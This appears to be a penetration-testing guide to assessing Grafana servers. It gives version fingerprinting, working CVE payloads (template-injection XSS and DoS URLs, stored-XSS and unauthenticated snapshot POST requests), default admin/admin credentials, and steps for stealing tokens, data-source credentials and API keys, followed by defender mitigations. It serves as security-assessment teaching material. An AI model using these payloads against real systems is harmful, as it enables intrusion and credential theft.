## 1. Overview

Grafana is an open-source analytics and interactive visualization web application. When encountering a Grafana instance during security assessments, multiple attack vectors may be available depending on the version and configuration.

**Key Detection Method:** Navigate to `https://example.com/login` and examine the response. The login form and source code will confirm Grafana's presence.

**Version Identification:** Check the JSON response body at `/login` for version information:

```json
"isEnterprise":false,"latestVersion":"9.0.0","version":"8.3.2"
```

The `version` field reveals the exact Grafana version running on the target.

---

## 2. Exploitation Methods

### 2.1 Version-Based Vulnerability Assessment

**Step 1: Identify Grafana Version**

- Request `https://example.com/login`
- Inspect source code for JSON body containing version number
- Note the exact version (e.g., "8.3.2")

**Step 2: CVE Research**

- Search for known CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-18548/product_id-47055/Grafana-Grafana.html)
- Cross-reference version with applicable vulnerabilities
- Prioritize high-impact exploits

### 2.2 CVE-Specific Exploits

#### CVE-2021-41174 (Reflected XSS)

**Vulnerability:** Angular template injection in snapshot functionality

**Exploitation:**

```
https://example.com/dashboard/snapshot/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1
```

**Impact:** Execute arbitrary JavaScript in victim's browser context

---

#### CVE-2020-13379 (Denial of Service)

**Vulnerability:** Server-side template injection in avatar endpoint

**Exploitation:**

```
https://example.com/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
```

**Impact:** Application crash or resource exhaustion

---

#### CVE-2020-11110 (Stored XSS)

**Vulnerability:** Insufficient sanitization in snapshot creation

**Exploitation:**

```http
POST /api/snapshots HTTP/1.1
Host: example.com
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Connection: close

{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('XSS')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}
```

**Impact:** Persistent XSS affecting all users viewing the snapshot

---

#### CVE-2019-15043 (Unauthenticated API Access)

**Vulnerability:** Missing authentication on snapshot creation endpoint

**Exploitation:**

```http
POST /api/snapshots HTTP/1.1
Host: example.com
Connection: close
Content-Length: 235
Accept: */*
Accept-Language: en
Content-Type: application/json

{"dashboard":{"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows":[{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires":3600}
```

**Impact:** Unauthorized dashboard snapshot creation without authentication

---

### 2.3 Default Credentials Attack

**Target:** Initial Grafana installations with unchanged defaults

**Exploitation Steps:**

1. Navigate to `https://example.com/login`
2. Attempt authentication with credentials:
    - **Username:** `admin`
    - **Password:** `admin`
3. If successful, full administrative access is granted

**Impact:** Complete system compromise with admin privileges

---

### 2.4 Open Registration Check

**Target:** Grafana instances with public signup enabled

**Exploitation Steps:**

1. Check for signup functionality: `https://example.com/signup`
2. If accessible, register a new user account
3. Assess available privileges and functionality
4. Test for privilege escalation opportunities

**Impact:** Unauthorized access to internal dashboards and data sources

---

## 3. Higher Impact Scenarios

### 3.1 Chaining XSS with Admin Access

- Exploit stored XSS vulnerabilities (CVE-2020-11110)
- Target administrative users to steal session tokens
- Leverage admin privileges to access data sources
- Extract database credentials or API keys configured in Grafana

### 3.2 Data Source Exploitation

- Gain access via default credentials or open signup
- Enumerate configured data sources (databases, APIs, cloud services)
- Extract credentials from data source configurations
- Pivot to backend systems using discovered credentials

### 3.3 Dashboard-Based Reconnaissance

- Access internal dashboards revealing infrastructure topology
- Identify monitoring targets and network architecture
- Discover internal hostnames, IP ranges, and services
- Map relationships between systems for lateral movement planning

### 3.4 API Key Harvesting

- Compromise admin account through any exploitation method
- Navigate to configuration settings
- Extract API keys with extended privileges
- Use API keys for persistent access or automation

---

## 4. Mitigations

### For Defenders

**Immediate Actions:**

- Update Grafana to the latest stable version
- Change default admin credentials immediately
- Disable public signup unless explicitly required
- Implement strong password policies

**Configuration Hardening:**

- Enable authentication on all API endpoints
- Restrict snapshot creation to authenticated users only
- Implement Content Security Policy (CSP) headers
- Configure rate limiting on authentication endpoints

**Network Controls:**

- Place Grafana behind VPN or IP whitelist
- Use reverse proxy with WAF capabilities
- Enable HTTPS with strong TLS configuration
- Implement network segmentation for data sources

**Monitoring & Detection:**

- Log all authentication attempts and API calls
- Alert on unusual snapshot creation patterns
- Monitor for XSS payload patterns in requests
- Track failed authentication attempts

**Best Practices:**

- Regular security audits and vulnerability assessments
- Principle of least privilege for user accounts
- Separate read-only and administrative users
- Regular review of configured data sources and permissions

---

## 🎯 Quick Assessment Checklist

- [ ] Identify Grafana version from login page
- [ ] Check for applicable CVEs based on version
- [ ] Test default credentials (admin/admin)
- [ ] Verify if signup is enabled
- [ ] Test for XSS in snapshot functionality
- [ ] Attempt unauthenticated API access
- [ ] Enumerate accessible dashboards and data sources
- [ ] Document all findings with reproduction steps

**Pro Tip:** Start with low-impact reconnaissance before attempting exploitation. Always operate within scope and maintain detailed documentation! 🚀